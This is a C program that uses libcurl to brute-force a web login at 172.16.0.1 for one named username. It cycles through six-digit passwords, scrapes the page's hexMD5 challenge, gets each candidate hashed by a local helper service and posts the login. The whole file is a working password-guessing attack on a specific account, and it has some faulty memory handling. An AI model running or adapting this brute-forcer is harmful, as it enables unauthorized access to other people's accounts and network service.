//
//  main.c
//  xinqidian_libcurl
//
//  Created by 郜俊博 on 2018/6/3.
//  Copyright © 2018年 郜俊博. All rights reserved.
//

#include <stdio.h>

#include <curl/curl.h>
#include <stdlib.h>
#include <regex.h>
#include <string.h>
#include <unistd.h>
struct url_data {
    size_t size;
    char *data;
};

size_t write_data(void *ptr,size_t size,size_t nmumbm,struct url_data *data) {
    size_t index = data->size;
    size_t n = size*nmumbm;
    char *tmp;
    data->size += n;
#if DEBUG
    // fprintf(stderr, "data at %p size=%ld nmemb=%ld\n",ptr,size,nmumbm);
#endif
    tmp = (char *)realloc(data->data, data->size+1);
    if (tmp) {
        data->data = tmp;
    } else {
        if (data->data) {
            free(data->data);
        }
        fprintf(stderr, "Failed to allocate memory \n");
        
    }
    memcpy((data->data+index),ptr,n);
    data->data[data->size] = '\0';
    return size*nmumbm;
}

struct curl_slist *loalHeader() {
    struct curl_slist *chunk = NULL;
    chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
    chunk = curl_slist_append(chunk, "Accept: text/plain");
    return chunk;
}
struct curl_slist *loginHeader() {
    struct curl_slist *chunk = NULL;
    chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
    chunk = curl_slist_append(chunk, "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8");
    chunk = curl_slist_append(chunk, "Referer: http://172.16.0.1/login");
    chunk = curl_slist_append(chunk, "Accept: */*");
    chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/    537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36");
    chunk = curl_slist_append(chunk, "Upgrade-Insecure-Requests: 1");
    chunk = curl_slist_append(chunk, "Origin: http://172.16.0.1");
    chunk = curl_slist_append(chunk, "Host: 172.16.0.1");
    chunk = curl_slist_append(chunk, "Cache-Control: max-age=0");
    return chunk;
}
void free_struct( struct url_data *data) {
    data->size = 0;
    free(data->data);
}

char *hand_url(char *url,char *body,struct curl_slist *chunk) {
    CURL *curl;
    CURLcode res;
    struct  url_data data ;
    data.size = 0;
    data.data = (char *)malloc(8192);
    if (data.data == NULL) {
        fprintf(stderr, "Failed to alloc Memory.\n");
        return  NULL;
    }
    data.data[0]='\0';
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL,url);
        curl_easy_setopt(curl, CURLOPT_VERBOSE,0L); // 0不输出详细信息  1 输出详细信息
        if (body != NULL) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
        }
        if ( chunk != NULL) {
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER,chunk);
        }
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA,&data);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Curl Perform failed:%s\n",curl_easy_strerror(res));
        }
        curl_easy_cleanup(curl);
    }
    return data.data;
}


void matchstring(char *src,char *reg,char **dst,int size) {
    regex_t preg;
    regmatch_t pmatch[size];
    int  rc;
    long len;
    char error[100];
    int compresult =regcomp(&preg, reg, REG_EXTENDED | REG_NEWLINE);
    if( compresult != 0 ) {
        printf("regex compile error!\n");
        regerror ( compresult, &preg, error,  100);
    }
    rc = regexec(&preg, src, size, pmatch, 0);
    if (rc != 0) {
        printf("no match\n");
    }
    for (int i = 0; i < size && pmatch[i].rm_so >= 0; ++i) {
        len = pmatch[i].rm_eo - pmatch[i].rm_so;
        char *buf = (char *)malloc(len);
        strncpy(buf, src + pmatch[i].rm_so, len);
        buf[len-1]='\0';
        dst[i] = buf;
    }
    regfree(&preg);
}



void strreplace(char *src,char old,char new) {
    for (long i=0; i<strlen(src); i++) {
        if (src[i] == old) {
            src[i] = new;
        }
    }
}


char *username = "zd822021";


int main(int argc, const char * argv[]) {
    
    char password[20];
    struct curl_slist *_localHeader = loalHeader();
    struct curl_slist *_loginHeader = loginHeader();
    
    for (int j=626700; j<999999; j++) {
        
        sprintf(password, "%.6d",j);
        char *html = hand_url("http://172.16.0.1/login",NULL,NULL);
        char **tmp_value =(char **)malloc(sizeof(char*)*2);
        char **value = (char **)malloc(sizeof(char*)*3);
        matchstring(html, "hexMD5(.*)",tmp_value,2);
        matchstring(tmp_value[0], "('.[^+]*').*('.[^+]*')",value,3);
        char *high = value[1];
        strreplace(high, '\\', '+');
        char *low = value[2];
        strreplace(low, '\\', '+');
        char *body = (char *)malloc(200);
        snprintf(body,200,"{\"high\":\"%s\",\"mid\":\"%s\",\"low\":\"%s\"}", high,password,low);
        char *token = hand_url("http://127.0.0.1:3000", body,_localHeader);
        char *loginBody=(char*)malloc(100);
        snprintf(loginBody,100,"username=%s&password=%s&dst=&popup=true", username,token);
        char *reponse = hand_url("http://172.16.0.1/login", loginBody,_loginHeader);
        printf("%s\n",password);
        
        free(html);
        free(body);
        free(token);
        free(loginBody);
        free(reponse);
        for (int i=0; i<2; i++) {
            free(tmp_value[i]);
        }
        for (int i=0; i<3; i++) {
            free(value[i]);
        }
        free(tmp_value);
        free(value);
    }
    return 0;
}
